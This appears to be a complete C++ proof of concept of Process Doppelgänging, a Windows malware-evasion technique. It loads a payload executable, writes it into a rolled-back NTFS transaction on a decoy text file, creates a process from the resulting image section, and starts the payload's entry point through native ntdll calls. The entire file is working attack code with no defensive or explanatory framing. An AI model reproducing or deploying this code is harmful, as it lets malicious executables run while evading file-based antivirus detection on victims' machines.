#include <Windows.h>
#include <stdio.h>
#include "CWLInc.h"
#include <iostream>
using namespace std;
#pragma comment(lib, "KtmW32.lib")

BYTE* GetPayloadBuffer(OUT size_t& p_size) {
	HANDLE hFile = CreateFileW(L"C:\\temp\\payload.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE) {
		perror("[-] Unable to open payload file... \n");
		exit(-1);
	}
	p_size = GetFileSize(hFile, 0);
	BYTE* bufferAddress = (BYTE*)VirtualAlloc(0, p_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (bufferAddress == NULL) {
		perror("[-] Failed to allocated memory for payload buffer... \n");
		exit(-1);
	}
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, bufferAddress, p_size, &bytesRead, NULL)) {
		perror("[-] Failed to read payload buffer... \n");
		exit(-1);
	}
	return bufferAddress;
}

BOOL CreateNTFSTransaction(OUT HANDLE &phTransaction, OUT HANDLE &phFileTransacted) {
	_NtCreateTransaction pNtCreateTransaction = (_NtCreateTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateTransaction");
	if (pNtCreateTransaction == NULL) {
		perror("[-] Error NtCreateTransaction API not found!!\n");
		exit(-1);
	}
	HANDLE hTransaction = NULL;
	HANDLE hFileTransacted = INVALID_HANDLE_VALUE;
	_OBJECT_ATTRIBUTES objAttr;
	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");

	wprintf(L"[*] Transact: \n");
	// Create NTFS Transaction object
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	pNtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &objAttr, NULL, NULL, 0, 0, 0, NULL, NULL);
	if (hTransaction == NULL) {
		perror("[-] Error Creating Transaction\n");
		exit(-1);
	}
	printf("[+] NTFS Transaction object created\n");
	
	
	//wchar_t dummy_name[MAX_PATH] = { 0 };
	//wchar_t temp_path[MAX_PATH] = { 0 };
	//DWORD size = GetTempPathW(MAX_PATH, temp_path);
	//GetTempFileNameW(temp_path, L"DG", 0, dummy_name);
	
	// Open target file for transaction
	hFileTransacted = CreateFileTransactedW(targetPath, GENERIC_READ | GENERIC_WRITE, 0, NULL,
										OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	wprintf(L"\t[+] Opened Dummy File: %s \n", targetPath);
	if (hFileTransacted == INVALID_HANDLE_VALUE) {
		printf("last error: %d\n", GetLastError());
		perror("[-] Error Opening Target File For Transaction\n");
		exit(-1);
	}
	phTransaction = hTransaction;
	phFileTransacted = hFileTransacted;
	return TRUE;
}

HANDLE CreateSectionFromTransactedFile(HANDLE hFileTransacted) {
	wprintf(L"[*] Load: \n");
	_NtCreateSection pNtCreateSection = (_NtCreateSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection");
	HANDLE hSection = NULL;
	if (pNtCreateSection == NULL) {
		perror("[-] Error NtCreateSection API not found!!\n");
		exit(-1);
	}
	// SEC_IMAGE - Maping the transacted file as an executable image. performs PE header validation
	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hFileTransacted);
	if (hSection == NULL) {
		perror("[-] Error Creating Section From Transacted File...\n");
		exit(-1);
	}
	wprintf(L"\t[+] Section created from transacted file \n");
	return hSection;
}

BOOL RollbackTransaction(HANDLE hTransaction) {
	wprintf(L"[*] Rollback: \n");
	NTSTATUS status;
	_NtRollbackTransaction pNtRollbackTransaction = (_NtRollbackTransaction)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRollbackTransaction");
	if (pNtRollbackTransaction == NULL) {
		perror("[-] Error NtRollbackTransaction API not found!!\n");
		exit(-1);
	}
	status = pNtRollbackTransaction(hTransaction, TRUE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error occur during rollback!!\n");
		exit(-1);
	}
	wprintf(L"\t[+] Transaction Rolled back.. \n");
	return TRUE;
}


BOOL ProcessDoppelganging(BYTE* payloadBuffer, DWORD payloadSize) {
	HANDLE hTransaction = NULL;
	HANDLE hTransactedFile = INVALID_HANDLE_VALUE;
	HANDLE hSection = NULL;
	HANDLE hProcess = NULL;
	DWORD bytesWritten = 0;
	DWORD returnLength = 0;
	ULONG_PTR entryPoint = 0;
	PEB* remotePEB;
	UNICODE_STRING uTargetFile;
	PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
	NTSTATUS status;
	PROCESS_BASIC_INFORMATION pbi;
	HANDLE hThread;
	_NtCreateProcessEx pNtCreateProcessEx = (_NtCreateProcessEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateProcessEx");
	if (pNtCreateProcessEx == NULL) {
		perror("[-] Error NtCreateProcessEx API not found!!\n");
	}
	_NtQueryInformationProcess pNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (pNtQueryInformationProcess == NULL) {
		perror("[-] Error NtQueryInformationProcess API not found\n");
		exit(-1);
	}
	_NtReadVirtualMemory pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	if (pNtReadVirtualMemory == NULL) {
		perror("[-] Error NtReadVirtualMemory API not found\n");
		exit(-1);
	}
	_RtlImageNTHeader pRtlImageNTHeader = (_RtlImageNTHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
	if (pRtlImageNTHeader == NULL) {
		perror("[-] Error RtlImageNTHeader API not found\n");
		exit(-1);
	}
	_RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateProcessParametersEx");
	if (pRtlCreateProcessParametersEx == NULL) {
		perror("[-] Error RtlCreateProcessParametersEx API not found\n");
		exit(-1);
	}
	_RtlInitUnicodeString pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");
	if (pRtlInitUnicodeString == NULL) {
		perror("[-] Error RtlInitUnicodeString API not found\n");
		exit(-1);
	}
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
	if (pNtReadVirtualMemory == NULL) {
		perror("\t[-] Error NtCreateThreadEx API not found\n");
		exit(-1);
	}
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		perror("[-] Error RtlCreateProcessParametersEx API not found\n");
		exit(-1);
	}
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (pNtWriteVirtualMemory == NULL) {
		perror("\t[-] Error NtWriteVirtualMemory API not found\n");
		exit(-1);
	}
	_ZwClose pZwClose = (_ZwClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwClose");
	if (pZwClose == NULL) {
		perror("\t[-] Error ZwClose API not found!!\n");
	}
	WCHAR targetExe[MAX_PATH];
	//lstrcpyW(targetExe, L"C:\\Users\\CWLabs\\AppData\\Local\\Temp\\calc.exe");
	//lstrcpyW(targetExe, L"C:\\windows\\system32\\calc.exe");
	lstrcpyW(targetExe, L"C:\\temp\\mynotes.txt");
	// Create NTFS Transaction - Transact
	CreateNTFSTransaction(hTransaction, hTransactedFile);
	// Write payload buffer into transaction
	if (!WriteFile(hTransactedFile, payloadBuffer, payloadSize, &bytesWritten, NULL)) {
		perror("[-] Error writing payload into transaction!!\n");
		exit(-1);
	}
	wprintf(L"\t[+] Payload Written To the Transacted File.. \n");
	// Create Section In Transacted File
	// Later the newly created section becomes the base of the new process.
	hSection = CreateSectionFromTransactedFile(hTransactedFile);
	if (hSection == NULL) {
		perror("\t[-] Invalid Section Handle\n");
		exit(-1);
	}
	// Now the payload is loaded into the section, the payload file is no longer useful for us
	// Now we can rollback the transaction
	RollbackTransaction(hTransaction);

	// Closing handles
	pZwClose(hTransaction);
	hTransaction = NULL;
	CloseHandle(hTransactedFile);
	hTransactedFile = INVALID_HANDLE_VALUE;

	wprintf(L"[*] Animate: \n");
	// Bringing Doppelganging to life. Actual work begins from here...
	// Creating Process with the transacted section.
	status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, 
						GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
	if (!NT_SUCCESS(status)) {
		perror("\t[-] Error Creating Process from section\n");
		exit(-1);
	}
	wprintf(L"\t[+] Successfully created process from section... \n");

	// Getting Process Infromation
	status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (!NT_SUCCESS(status)) {
		perror("\t[-] Error Getting Process Infromation!!\n");
		exit(-1);
	}
	// Getting EntryPoint 
	BYTE imageData[0x1000];
	ZeroMemory(imageData, sizeof(imageData));
	status = pNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &imageData, 0x1000, NULL);
	if (!NT_SUCCESS(status)) {
		perror("\t[-] Error Getting Process Infromation!!\n");
		exit(-1);
	}
	wprintf(L"\t[+] Base Address of target process PEB: %p \n", (ULONG_PTR)((PPEB)imageData)->ImageBaseAddress);
	entryPoint = (pRtlImageNTHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
	wprintf(L"\t[+] Image Base Address of the payload buffer in remote process: %p \n", entryPoint);
	entryPoint += (ULONG_PTR)((PPEB)imageData)->ImageBaseAddress;
	wprintf(L"\t[+] EntryPoint of the payload buffer: %p \n", entryPoint);

	WCHAR targetPath[MAX_PATH];
	lstrcpyW(targetPath, L"C:\\temp\\mynotes.txt");
	// Create parameters for newly created process
	pRtlInitUnicodeString(&uTargetFile, targetPath);
	status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFile, NULL, NULL, 
					&uTargetFile, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (!NT_SUCCESS(status)) {
		perror("\t[-] Error Creating Process Parameters!!\n");
		exit(-1);
	}
	printf("\t[+] Process Parameters Created!!\n");


	// copying parameters to the target process memory
	PVOID paramBuffer = processParameters;
	SIZE_T paramSize = processParameters->EnvironmentSize + processParameters->MaximumLength;
	status = pNtAllocateVirtualMemory(hProcess, &paramBuffer , 0, &paramSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		perror("[-] Error Allocating Memory For Parameters!!\n");
		exit(-1);
	}
	printf("\t[+] Allocated Memory For Parameters %p\n",paramBuffer);
	size_t xbytesWritten = 0;
	status = pNtWriteVirtualMemory(hProcess, processParameters, processParameters, 
					processParameters->EnvironmentSize + processParameters->MaximumLength, NULL);
	if (!NT_SUCCESS(status)) {
		//perror("[-] Error Writing Process Parameters\n");
		std::cerr << "[-] Error Writing Process Parameters: " << std::hex << status << std::endl;
		exit(-1);
	}
	printf("\t[+] ProcessParameters written to the remote process parameters addresss: %p\n",processParameters);

	// Updating remotePEB process parameters
	remotePEB = (PEB *)pbi.PebBaseAddress;
	if (!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
		perror("[-] Error Updating Process Parameters!!\n");
		exit(-1);
	}
	printf("\t[+] Updated Remote Process Parameters Address\n");


	// Create Thread
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
						(LPTHREAD_START_ROUTINE) entryPoint, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		std::cerr << "\t[-] Error Creating Thread: " << std::hex << status << std::endl;
		exit(-1);
	}
	printf("\t[+] Thread Executed...\n");


	return TRUE;
}


int main() {
	size_t payloadSize = 0;
	BYTE* payloadBuffer = GetPayloadBuffer(payloadSize);
	BOOL isSuccess = ProcessDoppelganging(payloadBuffer, (DWORD)payloadSize);
	system("pause");
}